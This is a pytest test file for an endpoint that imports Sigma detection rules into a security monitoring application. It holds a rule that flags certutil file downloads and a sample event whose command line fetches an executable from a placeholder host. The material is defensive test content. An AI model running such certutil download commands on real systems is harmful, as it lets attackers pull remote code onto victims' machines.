from pathlib import Path

import pytest
import yaml

from app.detection import rules as rules_module
from app.detection.sigma_import import convert_sigma
from app.models import AuditLog, Event
from tests.test_settings import _login

SAMPLES_DIR = Path(__file__).resolve().parents[2] / "docs" / "sigma_samples"
URL = "/api/settings/rules/import-sigma"

VALID = """
title: Test certutil download
id: b642d080-4afd-4751-bba2-375751387635
logsource: {product: windows, category: process_creation}
detection:
  selection:
    EventID: 4688
    Image|endswith: '\\certutil.exe'
    CommandLine|contains|all: ['-urlcache', '-f']
  condition: selection
level: high
tags: [attack.command_and_control, attack.t1105]
"""


@pytest.fixture(autouse=True)
def isolated_rules(tmp_path, monkeypatch):
    # Write imports to a temp dir and undo any RULES.append so other tests are unaffected.
    monkeypatch.setattr(rules_module, "IMPORTED_DIR", tmp_path)
    saved = list(rules_module.RULES)
    yield tmp_path
    rules_module.RULES[:] = saved


@pytest.fixture()
def admin(client, seed_users):
    return _login(client, "test_admin", "TestAdminPass123!")


def test_valid_import_saved_disabled_with_tags(client, admin, db_session, isolated_rules):
    resp = client.post(URL, headers=admin, json={"yaml": VALID})
    assert resp.status_code == 201
    body = resp.json()
    assert body["enabled"] is False and body["technique_ids"] == ["T1105"]

    saved = yaml.safe_load((isolated_rules / "b642d080-4afd-4751-bba2-375751387635.yml").read_text())
    assert saved["enabled"] is False
    assert saved["detection"]["selection"] == {"event_id": 4688, "process|endswith": "\\certutil.exe", "command_line|contains|all": ["-urlcache", "-f"]}
    assert "attack.t1105" in saved["tags"]

    # Shows up in the rules list and can be enabled with the existing toggle.
    assert any(r["id"] == body["id"] and not r["enabled"] for r in client.get("/api/settings/rules", headers=admin).json())
    assert client.patch(f"/api/settings/rules/{body['id']}", headers=admin, json={"enabled": True}).json()["enabled"] is True

    audit = db_session.query(AuditLog).filter(AuditLog.action == "sigma_import").one()
    assert audit.success and "Test certutil download" in audit.detail


def test_converted_rule_matches_events():
    rule = rules_module._rule_from_yaml(convert_sigma(VALID))
    hit = Event(event_id=4688, process=r"C:\Windows\System32\CertUtil.exe", command_line="certutil -urlcache -f http://x/a.exe a.exe")
    miss = Event(event_id=4688, process=r"C:\Windows\System32\certutil.exe", command_line="certutil -urlcache http://x")
    assert rule.matches(hit) and not rule.matches(miss)


@pytest.mark.parametrize("path", sorted(SAMPLES_DIR.glob("*.yml")), ids=lambda p: p.name)
def test_samples_convert(path):
    rules_module._rule_from_yaml(convert_sigma(path.read_text(encoding="utf-8")))


def test_invalid_yaml_rejected(client, admin, db_session):
    resp = client.post(URL, headers=admin, json={"yaml": "title: [unclosed\n  : :"})
    assert resp.status_code == 400 and resp.json()["detail"] == "Invalid YAML"
    assert db_session.query(AuditLog).filter(AuditLog.action == "sigma_import", AuditLog.success.is_(False)).count() == 1


def test_unsupported_modifier_rejected(client, admin, isolated_rules):
    resp = client.post(URL, headers=admin, json={"yaml": VALID.replace("CommandLine|contains|all", "CommandLine|windash")})
    assert resp.status_code == 400
    assert "Unsupported modifier 'windash'" in resp.json()["detail"]
    assert not list(isolated_rules.iterdir())


def test_oversize_rejected(client, admin):
    resp = client.post(URL, headers=admin, json={"yaml": VALID + "#" * (50 * 1024)})
    assert resp.status_code == 413


@pytest.mark.parametrize("username,password", [("test_analyst", "TestAnalystPass123!"), ("test_viewer", "TestViewerPass123!")])
def test_non_admin_403(client, seed_users, username, password, isolated_rules):
    resp = client.post(URL, headers=_login(client, username, password), json={"yaml": VALID})
    assert resp.status_code == 403
    assert not list(isolated_rules.iterdir())
